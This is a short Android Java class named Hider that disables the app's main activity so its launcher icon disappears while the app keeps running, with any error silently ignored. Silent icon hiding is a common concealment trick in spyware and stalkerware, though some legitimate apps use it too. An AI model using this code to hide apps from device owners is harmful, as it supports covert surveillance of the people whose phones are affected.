package com.vanta.core;

import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;

public class Hider {
    public static void hide(Context c) {
        try {
            c.getPackageManager().setComponentEnabledSetting(
                new ComponentName(c, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        } catch (Exception e) {}
    }
}
